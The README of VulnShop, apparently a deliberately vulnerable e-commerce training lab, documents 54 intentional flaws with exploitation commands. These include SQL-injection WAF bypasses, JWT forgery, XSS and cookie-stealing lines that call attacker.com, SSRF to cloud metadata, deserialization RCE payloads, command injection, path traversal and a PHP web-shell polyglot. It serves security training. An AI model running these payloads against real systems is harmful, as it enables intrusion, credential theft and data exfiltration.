# VulnShop — Deliberately Vulnerable E-commerce Platform

E-commerce platform built with **FastAPI + React + PostgreSQL** that contains **54 intentional vulnerabilities** organized into exploitable attack chains. Designed as a training ground for AI security agents.

## Architecture

| Service | Technology | Port |
|----------|-----------|--------|
| **Frontend** | React 18 + Vite 5 + TailwindCSS | 3000 |
| **Backend** | FastAPI + SQLAlchemy async + asyncpg | 8000 |
| **Database** | PostgreSQL 15 | 5432 |
| **Cache** | Redis 7 | 6379 |
| **Reverse proxy** | Nginx | 80 |
| **Metadata Mock** | Python HTTP (simulates AWS IMDS) | 169.254.169.254 (internal) |

## Quick start

```bash
docker compose up --build
```

- **Frontend:** http://localhost (via nginx) or http://localhost:3000 (direct)
- **API:** http://localhost/api/ (via nginx) or http://localhost:8000/api/ (direct)
- **Swagger UI:** http://localhost:8000/api/docs
- **GraphiQL:** http://localhost:8000/api/graphql

---

## Production deployment (VPS)

The stack ships with a **Caddy** reverse proxy that terminates TLS and obtains
Let's Encrypt certificates automatically. Two one-shot scripts deploy the whole
stack to a remote VPS and run end-to-end sanity checks:

| Script | Platform |
|--------|----------|
| `deploy.sh`  | macOS / Linux |
| `deploy.ps1` | Windows (PowerShell) |

Run from your local machine, both scripts:

1. Check SSH connectivity to the VPS.
2. Provision it: install Docker + Compose (via `get.docker.com`) and enable a
   `ufw` firewall allowing only ports **22/80/443**.
3. Upload the code (tar over ssh — no rsync required).
4. Build and start the stack with `docker compose up -d --build`.
5. Run sanity checks: container health, backend `/health`, external HTTPS 200,
   Let's Encrypt certificate, `/api/products` (backend + DB), HTTP→HTTPS
   redirect, and that the infra ports (5432/6379/8000) are closed to the internet.

The scripts are **idempotent** — re-running them re-deploys without wiping data
or re-issuing the certificate (persisted in the `caddy_data` volume, avoiding
ACME rate limits).

### Usage

```bash
# macOS / Linux — defaults target the reference VPS and domain
./deploy.sh

# Override host / domain / user / remote dir via env vars
VPS_HOST=1.2.3.4 VPS_USER=root DOMAIN=mydomain.xyz REMOTE_DIR=/opt/vulnshop ./deploy.sh
```

```powershell
# Windows (PowerShell)
./deploy.ps1
./deploy.ps1 -VpsHost 1.2.3.4 -Domain mydomain.xyz
```

### Prerequisites

- An `A` record for your domain pointing at the VPS public IP **before** the
  first run, so Caddy can complete the ACME challenge.
- SSH key access to the VPS (the scripts run non-interactively).

### Security note — infra ports on a public VPS

`docker-compose.yml` publishes `postgres:5432`, `redis:6379` and `backend:8000`,
but those mappings are bound to `127.0.0.1`, so they are **not** reachable from
the internet (a passwordless Redis exposed publicly would be compromised within
minutes). The "exposed to host" lab vulnerabilities are preserved: those services
stay reachable from the host itself and across the internal Docker network. Only
Caddy (80/443) is published publicly.

## Seed users

| Email | Password | Role | Hash |
|-------|----------|-----|------|
| `admin@vulnshop.com` | `Admin2024Secure!` | admin | bcrypt |
| `support@vulnshop.com` | `Support2024!` | support | bcrypt |
| `seller@vulnshop.com` | `Seller2024!` | seller | bcrypt |
| `user1@test.com` | `password123` | customer | MD5 (crackable) |
| `user2@test.com` | `qwerty` | customer | MD5 (crackable) |

Sequential IDs: admin=1, support=2, seller=3, user1=4, user2=5.

## Difficulty levels

The `DIFFICULTY` variable in `.env` controls the depth of the protections:

| Level | WAF | Rate Limiter | HTML Sanitizer |
|-------|-----|-------------|-----------------|
| `easy` | Disabled | Disabled | No sanitization |
| `medium` | Case-sensitive, no body decode | Trusted XFF, case-sensitive | Case-sensitive (bypass with uppercase) |
| `hard` | Case-insensitive, single decode | Case-insensitive, but trusted XFF | Case-insensitive, but no HTML entity decoding |

---

## Vulnerabilities (54 total)

### Global Protections (bypassable)

#### V01 — Case-sensitive WAF regex
- **File:** `backend/app/middleware/waf.py:32-43`
- **Type:** WAF Bypass
- **Description:** The WAF's SQL patterns are case-sensitive on `medium` difficulty. They only match `UNION`, `SELECT`, etc. in exact uppercase.
- **Exploitation:**
```bash
# The WAF blocks:
curl "http://localhost:8000/api/products/search?q=test' UNION SELECT 1--"

# Bypass with case mixing:
curl "http://localhost:8000/api/products/search?q=test' uNiOn SeLeCt 1--"
```

#### V02 — WAF doesn't analyze body if Content-Type != JSON/form
- **File:** `backend/app/middleware/waf.py:128-143`
- **Type:** WAF Bypass
- **Description:** The WAF only inspects the body if `Content-Type` is `application/json` or `application/x-www-form-urlencoded`. Any other type (such as `text/plain`) is not analyzed.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/import/orders \
  -H "Content-Type: text/plain" \
  -d '{"format":"json","data":"{\"py/reduce\":[{\"py/function\":\"os.system\"},{\"py/tuple\":[\"id\"]}]}"}'
```

#### V03 — WAF doesn't filter inline SQL comments
- **File:** `backend/app/middleware/waf.py:192-194`
- **Type:** WAF Bypass
- **Description:** There is no handling of inline SQL comments. The payload is not pre-processed to remove `/**/` before pattern verification.
- **Exploitation:**
```bash
curl "http://localhost:8000/api/products/search?q=test' UN/**/ION SEL/**/ECT 1--"
```

#### V04 — Rate limiter trusts X-Forwarded-For
- **File:** `backend/app/middleware/rate_limiter.py:36-51`
- **Type:** Rate Limit Bypass
- **Description:** The client IP is extracted from `X-Forwarded-For` without validation. Any client can spoof its IP.
- **Exploitation:**
```bash
# Each request with a different XFF is a "new" client:
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 10.0.0.$i" \
    http://localhost:8000/api/auth/login \
    -d '{"email":"test@test.com","password":"wrong"}'
done
```

#### V05 — Case-sensitive rate limiter matching
- **File:** `backend/app/middleware/rate_limiter.py:64-77`
- **Type:** Rate Limit Bypass
- **Description:** On `medium` difficulty, the path is compared case-sensitively. `/api/auth/login` has a limit of 10/min but `/API/AUTH/LOGIN` uses the global limit of 60/min.
- **Exploitation:**
```bash
# Bypass the login-specific limit:
curl -X POST http://localhost:8000/API/AUTH/LOGIN \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vulnshop.com","password":"attempt"}'
```

#### V06 — Rate limiter fail-open if Redis goes down
- **File:** `backend/app/middleware/rate_limiter.py:125-135`
- **Type:** Rate Limit Bypass
- **Description:** If Redis is unavailable, the rate limiter allows all requests (fail-open) instead of blocking them (fail-closed).
- **Exploitation:**
```bash
# If Redis goes down (or is disconnected), all requests pass through without a limit.
# From a scenario where you control the network: disconnect Redis from the backend.
```

#### V07 — Rate limiter bypass with X-Internal header
- **File:** `backend/app/middleware/rate_limiter.py:112-115`
- **Type:** Rate Limit Bypass
- **Description:** If the header `X-Internal: true` is present, all rate limit verification is skipped.
- **Exploitation:**
```bash
curl -H "X-Internal: true" \
  -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vulnshop.com","password":"attempt"}'
# No attempt limit
```

#### V16 — CORS allow_origins=["*"] + credentials=true
- **File:** `backend/app/main.py:67-74`
- **Type:** CORS Misconfiguration
- **Description:** CORS configured with `allow_origins=["*"]` and `allow_credentials=True`, allowing any origin to make authenticated cross-origin requests.
- **Exploitation:**
```html
<!-- From any attacker domain: -->
<script>
fetch('http://localhost:8000/api/auth/me', {
  credentials: 'include'
}).then(r => r.json()).then(data => {
  // Exfiltrate the authenticated user's data
  fetch('https://attacker.com/steal?data=' + JSON.stringify(data));
});
</script>
```

#### V52 — Full stack traces when DEBUG=true
- **File:** `backend/app/main.py:157-182`
- **Type:** Info Disclosure (CWE-209)
- **Description:** When `DEBUG=true` (the default configuration in `.env`), uncaught exceptions return the full traceback, including internal paths, library versions, and local variables.
- **Exploitation:**
```bash
# Force an error to obtain a stack trace:
curl "http://localhost:8000/api/products/search?q='"
# The response includes the traceback, file path, Python version, etc.
```

#### V53 — Nginx without security headers
- **File:** `nginx/nginx.conf:1-2`
- **Type:** Missing Security Headers
- **Description:** Nginx does not add `X-Frame-Options`, `X-Content-Type-Options`, `Content-Security-Policy`, or `Strict-Transport-Security`.
- **Exploitation:**
```html
<!-- Clickjacking: load VulnShop in an iframe -->
<iframe src="http://localhost" width="100%" height="600"></iframe>
<!-- The user interacts with VulnShop believing it is another page -->
```

#### V54 — CSP with 'unsafe-eval' + 'unsafe-inline'
- **Type:** Weak CSP
- **Description:** There is no CSP header configured in nginx or in the app, allowing the execution of inline scripts and eval() without restrictions. This enables XSS exploitation without a CSP bypass.

---

### Chain 1 — Auth / JWT (Guest → Admin)

#### V08 — JWT secret confusion (fallback to reset secret)
- **File:** `backend/app/utils/jwt.py:69-119`
- **Type:** Broken Authentication (CWE-287)
- **Description:** `verify_token()` first attempts to decode with `JWT_SECRET` (`vulnshop_jwt_s3cret`). If that fails, it falls back to `JWT_RESET_SECRET` (`reset123`). An attacker can sign tokens with `reset123`.
- **Exploitation:**
```python
import jwt
# Forge an admin token with the weak reset secret:
token = jwt.encode(
    {"user_id": 1, "email": "admin@vulnshop.com", "username": "admin", "role": "admin"},
    "reset123",
    algorithm="HS256"
)
print(token)
# Use: curl -H "Authorization: Bearer <token>" http://localhost:8000/api/admin/users
```

#### V09 — JWT alg:none
- **File:** `backend/app/utils/jwt.py:96`
- **Type:** Broken Authentication (CWE-287)
- **Description:** `allowed_algorithms = ["HS256", "none"]` — accepts tokens with `alg: none`. Note: python-jose >=3.3.0 may reject this; the primary bypass is V08.
- **Exploitation:**
```python
import base64, json
header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user_id":1,"role":"admin"}).encode()).rstrip(b'=')
token = f"{header.decode()}.{payload.decode()}."
```

#### V10 — JWT accepts tokens without exp field
- **File:** `backend/app/utils/jwt.py:98-101`
- **Type:** Broken Authentication (CWE-613)
- **Description:** `decode_options = {"verify_exp": False}` — tokens without an `exp` field are accepted indefinitely (eternal sessions).
- **Exploitation:**
```python
import jwt
# Token without expiration:
token = jwt.encode(
    {"user_id": 1, "role": "admin"},  # No "exp" field
    "reset123", algorithm="HS256"
)
# This token never expires
```

#### V11 — Role read from JWT without verifying DB
- **File:** `backend/app/middleware/auth_middleware.py:89-98`
- **Type:** Broken Access Control (CWE-639)
- **Description:** `get_current_user()` returns the `role` field directly from the JWT without querying the database. A forged token (via V08) with `role=admin` obtains admin privileges.
- **Exploitation:**
```python
import jwt
# Escalate from customer to admin:
token = jwt.encode(
    {"user_id": 4, "role": "admin", "email": "user1@test.com", "username": "user1"},
    "reset123", algorithm="HS256"
)
```

#### V12 — Mass assignment: register with account_type=seller
- **File:** `backend/app/routes/auth.py:84-95`
- **Type:** Mass Assignment (CWE-915)
- **Description:** The registration endpoint reads the hidden `account_type` field from the raw JSON body (outside the Pydantic schema). Sending `"account_type": "seller"` grants the seller role.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "attacker@evil.com",
    "username": "attacker",
    "password": "Password123!",
    "full_name": "Attacker",
    "account_type": "seller"
  }'
# Response: JWT with role=seller
```

#### V13 — User enumeration via timing
- **File:** `backend/app/routes/auth.py:156-163`
- **Type:** User Enumeration (CWE-203)
- **Description:** If the email does not exist, it responds in ~5ms. If the email exists but the password is incorrect, bcrypt takes ~200ms. The timing difference reveals which emails are registered.
- **Exploitation:**
```bash
# Nonexistent email (~5ms):
time curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"noexiste@test.com","password":"x"}'

# Existing email (~200ms):
time curl -s -X POST http://localhost:8000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vulnshop.com","password":"x"}'
```

#### V14 — session_token cookie HttpOnly=false
- **File:** `backend/app/routes/auth.py:192-201`
- **Type:** Insecure Cookie (CWE-1004)
- **Description:** The `session_token` cookie is set with `httponly=False` and `secure=False`. JavaScript can read it via `document.cookie`, allowing session theft via XSS.
- **Exploitation:**
```javascript
// From an XSS (V20/V21/V22):
new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie;
// session_token contains the full JWT
```

#### V15 — Reset token returned in response body
- **File:** `backend/app/routes/auth.py:241-247`
- **Type:** Info Disclosure (CWE-200)
- **Description:** The `/api/auth/password-reset-request` endpoint returns the reset token directly in the JSON body (`reset_token` field), instead of sending it only by email.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/auth/password-reset-request \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@vulnshop.com"}'
# Response: {"message": "Password reset email sent", "reset_token": "eyJ..."}

# Use the token to change the password:
curl -X POST http://localhost:8000/api/auth/password-reset \
  -H "Content-Type: application/json" \
  -d '{"token": "<reset_token>", "new_password": "hacked123"}'
```

#### V50 — Seed users with MD5 hashes
- **Type:** Weak Cryptography (CWE-328)
- **Description:** The users `user1@test.com` and `user2@test.com` use unsalted MD5 hashes. They are instantly crackable with rainbow tables.
- **Exploitation:**
```bash
# Obtain hashes via V49 (admin/users) or V42 (config -> DB creds -> direct psql):
# user1: password123 -> MD5: 482c811da5d5b4bc6d497ffa98491e38
# user2: qwerty -> MD5: d8578edf8458ce06fbc5bb76a58c5ca4
# Crack: https://crackstation.net/ or hashcat -m 0
```

#### V51 — Public Swagger UI
- **File:** `backend/app/main.py:57-64`
- **Type:** Info Disclosure (CWE-200)
- **Description:** Swagger UI accessible without authentication at `/api/docs`. Exposes all of the API's endpoints, schemas, and parameters.
- **Exploitation:**
```
Navigate to: http://localhost:8000/api/docs
# Reveals all endpoints, including the admin and import ones
```

---

### Chain 2 — XSS (Stored + Reflected)

#### V20 — Reflected XSS in search
- **File:** `backend/app/routes/products.py:156-159`
- **Type:** Reflected XSS (CWE-79)
- **Description:** The search parameter `q` is returned in the `query` field of the response without sanitization. If the frontend renders this value with `dangerouslySetInnerHTML` or direct interpolation, it executes JavaScript.
- **Exploitation:**
```bash
curl "http://localhost:8000/api/products/search?q=<script>alert('XSS')</script>"
# Response: {"query": "<script>alert('XSS')</script>", "results": [...]}
```

#### V21 — Stored XSS in review body (sanitizer bypass)
- **File:** `backend/app/routes/reviews.py:211-215`, `backend/app/utils/sanitizer.py:79-96`
- **Type:** Stored XSS (CWE-79)
- **Description:** The body of reviews passes through `sanitize_html()`, which on `medium` difficulty is case-sensitive. `onerror=` in lowercase is removed, but `ONERROR=` in uppercase passes through.
- **Exploitation:**
```bash
# Login first to obtain a token, then:
curl -X POST http://localhost:8000/api/products/1/reviews \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "Normal review",
    "rating": 5,
    "body": "<img src=x ONERROR=alert(document.cookie)>"
  }'
# The payload is stored and executes when another user views the product
```

#### V22 — Stored XSS in review title (no sanitization)
- **File:** `backend/app/routes/reviews.py:211-215`
- **Type:** Stored XSS (CWE-79)
- **Description:** The review's `title` field is stored without any sanitization. If the frontend renders it as HTML, it allows XSS.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/products/1/reviews \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "<img src=x onerror=alert(1)>",
    "rating": 5,
    "body": "Normal review"
  }'
```

---

### Chain 3 — Business Logic

#### V25 — Cart accepts float quantity (truncation to 0)
- **File:** `backend/app/routes/cart.py:359-363`
- **Type:** Type Confusion (CWE-681)
- **Description:** The schema accepts a `float` for quantity. `int(0.001)` = `0`, creating an item with quantity 0 that costs $0 at checkout and does not decrement stock.
- **Exploitation:**
```bash
# 1. Add product to the cart
curl -X POST http://localhost:8000/api/cart/items \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"product_id": 1, "quantity": 1}'

# 2. Update quantity to a float:
curl -X PATCH http://localhost:8000/api/cart/items/1 \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"quantity": 0.001}'
# quantity truncated to 0 -> free item at checkout
```

#### V26 — Coupon race condition (TOCTOU)
- **File:** `backend/app/routes/cart.py:494-508`
- **Type:** Race Condition (CWE-362)
- **Description:** The "already used" check (SELECT) and the insertion (INSERT) are not atomic. There is no `SELECT FOR UPDATE` nor a `UNIQUE(coupon_id, user_id)` constraint. Concurrent requests can redeem the same coupon multiple times.
- **Exploitation:**
```bash
# Send 10 concurrent requests to apply the same coupon:
for i in $(seq 1 10); do
  curl -X POST http://localhost:8000/api/cart/apply-coupon \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    -d '{"code": "WELCOME10"}' &
done
wait
# The coupon is applied multiple times
```

#### V27 — Coupon stacking without limit
- **File:** `backend/app/routes/cart.py:115-131`
- **Type:** Business Logic (CWE-840)
- **Description:** There is no validation preventing multiple different coupons from being applied. Discounts accumulate without limit, potentially exceeding 100%.
- **Exploitation:**
```bash
# Apply coupon 1:
curl -X POST http://localhost:8000/api/cart/apply-coupon \
  -H "Authorization: Bearer <token>" \
  -d '{"code": "WELCOME10"}'

# Apply coupon 2:
curl -X POST http://localhost:8000/api/cart/apply-coupon \
  -H "Authorization: Bearer <token>" \
  -d '{"code": "SUMMER20"}'

# The discounts add up: 10% + 20% = 30%
```

#### V28 — Negative total allowed
- **File:** `backend/app/routes/cart.py:545-547`
- **Type:** Business Logic (CWE-840)
- **Description:** The total is not clamped to a minimum of 0. When the accumulated discounts exceed the subtotal, the total goes negative (credit in the customer's favor).
- **Status:** Requires P0 fix — currently blocked by a CHECK constraint in the DB.

#### V29 — Arbitrary exchange rate at checkout
- **File:** `backend/app/routes/cart.py:613-619`
- **Type:** Input Validation (CWE-20)
- **Description:** The `exchange_rate` field is accepted from the client and only validated as `> 0`. There is no verification against real exchange rates. A value of `0.001` reduces a $1000 order to $1.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/cart/checkout \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{
    "shipping_address": "123 Hack St",
    "payment_method": "card",
    "currency": "XYZ",
    "exchange_rate": 0.001
  }'
# Total: $1000 * 0.001 = $1.00
```

---

### Chain 4 — SSRF

#### V30 — Follow redirects bypass of IP blacklist
- **File:** `backend/app/routes/seller.py:329-340`
- **Type:** SSRF (CWE-918)
- **Description:** `httpx.AsyncClient(follow_redirects=True)` follows redirects automatically. The IP blacklist only verifies the initial URL. An external server that issues a 302 to `http://169.254.169.254/` bypasses the verification.
- **Exploitation:**
```bash
# 1. Set up an external server that redirects:
# redirect.py: return 302 -> http://169.254.169.254/latest/meta-data/

# 2. Import an image from the redirect:
curl -X POST http://localhost:8000/api/seller/import-image-url \
  -H "Authorization: Bearer <seller_token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://your-server.com/redirect"}'
# The error includes a preview of the metadata body (V32)
```

#### V31 — IPv6 mapped / decimal IP bypass
- **File:** `backend/app/routes/seller.py:45-69`, `seller.py:106-117`
- **Type:** SSRF (CWE-918)
- **Description:** `ipaddress.ip_address()` does not parse IPs in decimal format (e.g., `2852039166` = `169.254.169.254`) or octal. The resulting `ValueError` is caught silently and the request is allowed.
- **Exploitation:**
```bash
# Decimal IP of 169.254.169.254 = 2852039166
curl -X POST http://localhost:8000/api/seller/import-image-url \
  -H "Authorization: Bearer <seller_token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://2852039166/latest/meta-data/"}'
```

#### V32 — Data exfiltration via error message
- **File:** `backend/app/routes/seller.py:349-360`
- **Type:** Info Disclosure (CWE-209)
- **Description:** When the response is not an image, the error includes the first 500 characters of the body. This allows exfiltrating data from internal services (such as the AWS metadata mock).
- **Exploitation:**
```bash
# Point to an internal service that returns text:
curl -X POST http://localhost:8000/api/seller/import-image-url \
  -H "Authorization: Bearer <seller_token>" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://your-redirect-server.com/to-metadata"}'
# Error: "URL does not point to an image... Response preview: <AWS credentials>"
```

---

### Chain 5 — File Upload

#### V23 — SVG with `<script>` passes whitelist
- **File:** `backend/app/utils/image_handler.py:19-36`, `backend/app/main.py:82-85`
- **Type:** Unrestricted File Upload + XSS (CWE-434, CWE-79)
- **Description:** `.svg` is in the extension whitelist. SVG's magic bytes are `<?xml` and `<svg>` (text, not binary). An SVG with an embedded `<script>` passes validation. `StaticFiles` serves the file without a `Content-Disposition: attachment` header, rendering it inline in the browser.
- **Exploitation:**
```bash
# Create a malicious SVG:
cat > evil.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
EOF

# Upload:
curl -X POST http://localhost:8000/api/uploads/review-image \
  -H "Authorization: Bearer <token>" \
  -F "file=@evil.svg"
# Response: {"url": "/static/uuid.svg"}
# Visit /static/uuid.svg -> executes JavaScript
```

#### V24 — Polyglot GIF89a + payload
- **File:** `backend/app/utils/image_handler.py:71-93`
- **Type:** Unrestricted File Upload (CWE-434)
- **Description:** The magic-byte check only inspects the first 6-8 bytes. A file that begins with `GIF89a` followed by a PHP/JS payload passes as a valid GIF.
- **Exploitation:**
```bash
# Create a polyglot GIF:
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > polyglot.gif

# Upload:
curl -X POST http://localhost:8000/api/uploads/review-image \
  -H "Authorization: Bearer <token>" \
  -F "file=@polyglot.gif"
# Passes the extension validation (.gif) and magic bytes (GIF89a)
```

---

### Chain 6 — Insecure Deserialization

#### V39 — jsonpickle.decode() → RCE (easy)
- **File:** `backend/app/utils/serializer.py:139-167`, `backend/app/routes/export_import.py:247-266`
- **Type:** Insecure Deserialization (CWE-502)
- **Description:** The `/api/import/orders` endpoint with `format=json` uses `jsonpickle.decode()`, which executes `py/reduce`, `py/object`, and `py/exec` directives. Trivial RCE.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/import/orders \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "json",
    "data": "{\"py/reduce\": [{\"py/function\": \"os.system\"}, {\"py/tuple\": [\"id\"]}]}"
  }'
# Executes the "id" command on the server
```

#### V40 — yaml.load(FullLoader) RCE (medium)
- **File:** `backend/app/utils/serializer.py:105-131`
- **Type:** Insecure Deserialization (CWE-502)
- **Description:** `yaml.load(data, Loader=yaml.FullLoader)` allows `!!python/object/new:type` with `extend: exec`. `FullLoader` blocks `!!python/object/apply` but not `!!python/object/new`.
- **Exploitation:**
```bash
# YAML payload for RCE:
YAML_PAYLOAD=$(cat <<'YAML'
!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "import os; os.system('id')"
YAML
)

# Base64 encode and send:
B64=$(echo "$YAML_PAYLOAD" | base64 -w0)
curl -X POST http://localhost:8000/api/import/orders \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d "{\"format\": \"yaml\", \"data\": \"VSEXPORT_V2:$B64\"}"
```

#### V41 — Pickle RestrictedUnpickler bypass with startswith (hard)
- **File:** `backend/app/utils/serializer.py:31-64`
- **Type:** Insecure Deserialization (CWE-502)
- **Description:** `RestrictedUnpickler` validates with `module.startswith("app.models")`. A module named `app.models_evil` or `app.modelsX` passes the restriction. Additionally, allowed classes can chain `__reduce__` to escalate to RCE.
- **Exploitation:**
```python
# Craft a pickle with a module that begins with "app.models":
import pickle, base64
# The payload needs a module whose name begins with "app.models"
# but contains malicious code (requires filesystem control or
# chaining via __reduce__ of allowed classes)
```

---

### Chain 7 — Admin Panel

#### V42 — /api/admin/config without authentication
- **File:** `backend/app/routes/admin.py:80-99`
- **Type:** Missing Authentication (CWE-306)
- **Description:** The `/api/admin/config` endpoint does not have `Depends(get_current_user)`. Any unauthenticated request obtains DB credentials, the JWT secret, and internal configuration.
- **Exploitation:**
```bash
curl http://localhost:8000/api/admin/config
# Response:
# {
#   "config": {
#     "db_password": "vulnsh0p_db!",
#     "jwt_secret": "vulnshop_jwt_s3cret",
#     "jwt_reset_secret": "reset123",
#     ...
#   }
# }
```

#### V43 — Command injection via re.match() + shell=True
- **File:** `backend/app/routes/admin.py:159-218`
- **Type:** Command Injection (CWE-78)
- **Description:** `re.match(r"^\d{4}-\d{2}-\d{2}", body.date_range)` only validates the START of the string. A payload like `2024-01-01\n;id` passes validation because `2024-01-01` matches at the beginning. It is then interpolated into a shell command with `shell=True`.
- **Exploitation:**
```bash
# Forge an admin token via V08, then:
curl -X POST http://localhost:8000/api/admin/generate-report \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{
    "template_name": "sales",
    "date_range": "2024-01-01\n;id"
  }'
# Response includes the output of "id" in "report" or "errors"

# WAF bypass (the WAF detects ";"):
# Use unicode escapes in JSON: \u003b = ;
curl -X POST http://localhost:8000/api/admin/generate-report \
  -H "Authorization: Bearer <admin_token>" \
  -H "Content-Type: application/json" \
  -d '{"template_name":"sales","date_range":"2024-01-01\n\u003bid"}'
```

#### V44 — Path traversal with double URL encoding
- **File:** `backend/app/routes/admin.py:232-286`
- **Type:** Path Traversal (CWE-22)
- **Description:** The filter only blocks the literal `..`. After the check, `unquote()` is applied a second time. Double-encoded `%252e%252e` → first decode → `%2e%2e` (not `..`, passes the check) → second decode → `../`.
- **Exploitation:**
```bash
# Read /etc/passwd:
curl -H "Authorization: Bearer <admin_token>" \
  "http://localhost:8000/api/admin/logs?file=%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
# %252e%252e -> %2e%2e (passes check) -> .. (path traversal)
```

#### V45 — /api/debug/env exposes os.environ without auth
- **File:** `backend/app/main.py:139-154`
- **Type:** Info Disclosure (CWE-200)
- **Description:** A hidden endpoint (excluded from the OpenAPI schema with `include_in_schema=False`) that returns all environment variables without authentication. Includes passwords, JWT secrets, and AWS credentials.
- **Exploitation:**
```bash
curl http://localhost:8000/api/debug/env
# Response: {"DB_PASSWORD": "vulnsh0p_db!", "JWT_SECRET": "...", "AWS_ACCESS_KEY_ID": "...", ...}
```

#### V49 — /api/admin/users returns password_hash
- **File:** `backend/app/routes/admin.py:110-144`
- **Type:** Sensitive Data Exposure (CWE-200)
- **Description:** The user listing includes the `password_hash` field for each user. The MD5 hashes of user1 and user2 are instantly crackable.
- **Exploitation:**
```bash
curl -H "Authorization: Bearer <admin_token>" \
  http://localhost:8000/api/admin/users
# Response includes each user's password_hash
# MD5 hashes crackable on crackstation.net
```

---

### Chain 8 — IDOR

#### V33 — /api/invoices/{id} without authentication, sequential IDs
- **File:** `backend/app/routes/orders.py:319-380`
- **Type:** IDOR (CWE-639)
- **Description:** The invoices endpoint does not require authentication and uses sequential IDs (1, 2, 3...). It exposes the user's email, full name, phone, and last 4 digits of their card.
- **Exploitation:**
```bash
# Enumerate all invoices:
for i in $(seq 1 20); do
  curl -s http://localhost:8000/api/invoices/$i | jq '{order_id, user_email, user_full_name, total}'
done
```

#### V34 — UUID-to-ID leak via 302 redirect
- **File:** `backend/app/routes/orders.py:270-311`
- **Type:** Info Disclosure (CWE-200)
- **Description:** `/api/orders/{uuid}/invoice` returns a 302 with `Location: /api/invoices/{numeric_id}`. The Location header exposes the internal sequential ID, which is then used to enumerate V33.
- **Exploitation:**
```bash
# Obtain the UUID of one of your own orders:
ORDER_UUID=$(curl -s -H "Authorization: Bearer <token>" \
  http://localhost:8000/api/orders | jq -r '.[0].uuid')

# Follow the redirect to see the internal ID:
curl -v -H "Authorization: Bearer <token>" \
  "http://localhost:8000/api/orders/$ORDER_UUID/invoice" 2>&1 | grep Location
# Location: /api/invoices/3  <-- sequential ID exposed
```

#### V35 — GraphQL order(id) without ownership check
- **File:** `backend/app/routes/graphql.py:230-259`
- **Type:** IDOR (CWE-639)
- **Description:** The GraphQL `order(id)` resolver does not verify ownership. Any user (or anonymous) can query any order by sequential ID, including the buyer's data.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ order(id: 1) { id userId status total shippingAddr user { email fullName role } items { productId quantity unitPrice } } }"
  }'
```

#### V36 — GraphQL user(id) exposes personal data
- **File:** `backend/app/routes/graphql.py:261-284`
- **Type:** Info Disclosure (CWE-639)
- **Description:** The `user(id)` resolver exposes email, role, and full_name without requiring authentication or verifying ownership.
- **Exploitation:**
```bash
# Enumerate users:
for i in $(seq 1 10); do
  curl -s -X POST http://localhost:8000/api/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"{ user(id: $i) { id email username role fullName } }\"}"
done
```

#### V37 — GraphQL introspection enabled
- **File:** `backend/app/routes/graphql.py:292-294`
- **Type:** Info Disclosure (CWE-200)
- **Description:** GraphQL introspection is enabled, revealing the complete schema: types, fields, queries, and relationships.
- **Exploitation:**
```bash
curl -X POST http://localhost:8000/api/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}'
# Reveals: OrderType, UserType, ProductType and all their fields
```

#### V38 — /api/tickets/{id}/attachments without ownership check
- **File:** `backend/app/routes/tickets.py:336-380`
- **Type:** Missing Access Control (CWE-862)
- **Description:** It only verifies authentication, not that the user has access to the ticket. Any authenticated user can list the attachments of any ticket by enumerating IDs.
- **Exploitation:**
```bash
# Enumerate attachments of other people's tickets:
for i in $(seq 1 20); do
  curl -s -H "Authorization: Bearer <token>" \
    http://localhost:8000/api/tickets/$i/attachments
done
# The attachments may contain sensitive documents
```

---

### Chain 9 — CSRF

#### V46 — change-email accepts GET with query params
- **File:** `backend/app/routes/profile.py:209-258`
- **Type:** CSRF via GET (CWE-352)
- **Description:** The `/api/profile/change-email` endpoint accepts both GET and POST. With a `SameSite=Lax` cookie, top-level navigation GETs send cookies. An external link changes the victim's email.
- **Exploitation:**
```html
<!-- Attacker's page: -->
<a href="http://localhost/api/profile/change-email?new_email=attacker@evil.com">
  Click to see your prize
</a>
<!-- On click, the browser sends the session_token cookie and changes the email -->
```

#### V47 — change-password without CSRF validation
- **File:** `backend/app/routes/profile.py:261-318`
- **Type:** CSRF (CWE-352)
